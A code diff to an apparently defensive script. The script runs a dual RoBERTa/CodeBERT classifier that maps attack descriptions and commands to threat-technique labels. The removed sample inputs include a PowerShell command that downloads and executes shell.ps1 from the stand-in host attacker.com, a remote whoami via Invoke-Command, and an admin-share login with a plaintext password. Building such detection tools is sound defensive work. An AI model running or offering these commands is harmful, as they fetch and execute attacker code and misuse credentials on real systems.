@@ -4,11 +4,9 @@ from transformers import RobertaTokenizer, RobertaModel
 import json
 import torch.nn as nn
 
-# ===== 路径配置 =====
-save_path = "/root/ClarityG/TTP/result/dual_0.4"
+save_path = "ClarityG/TTP/result/dual_0.4"
 device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
 
-# ===== 定义模型结构 =====
 class DualEncoder(nn.Module):
     def __init__(self, roberta_model, codebert_model, hidden_size=768, num_labels=10):
         super().__init__()
@@ -36,7 +34,7 @@ def init_dual_model(save_path, model_path=None):
     tokenizer_cmd = RobertaTokenizer.from_pretrained(f"{save_path}/tokenizer_cmd")
 
     roberta_encoder = RobertaModel.from_pretrained(
-        "/root/ClarityG/TTP/models/roberta-base"
+        "ClarityG/TTP/models/roberta-base"
     )
     codebert_encoder = RobertaModel.from_pretrained(
         "/root/ClarityG/TTP/models/codebert-base"
@@ -100,22 +98,8 @@ def predict_dual(
 
     return results
 
-# ===== 主程序 =====
 if __name__ == "__main__":
-    samples = [
-        {
-            "text": "The attacker exploited a vulnerability to achieve remote code execution.",
-            "cmd": "powershell Invoke-Command -ComputerName target -ScriptBlock {whoami}"
-        },
-        {
-            "text": "Malware established a reverse shell connection to the attacker server.",
-            "cmd": "cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command \"Invoke-WebRequest http://attacker.com/shell.ps1 -OutFile shell.ps1; ./shell.ps1\""
-        },
-        {
-            "text": "An adversary attempted brute force on RDP to gain access.",
-            "cmd": "net use \\\\192.168.1.10\\C$ /user:Administrator P@ssw0rd"
-        }
-    ]
+
     model, tokenizer_text, tokenizer_cmd, id2label = init_dual_model(
         save_path,
         model_path=os.path.join(save_path, "best_model_state.pt")
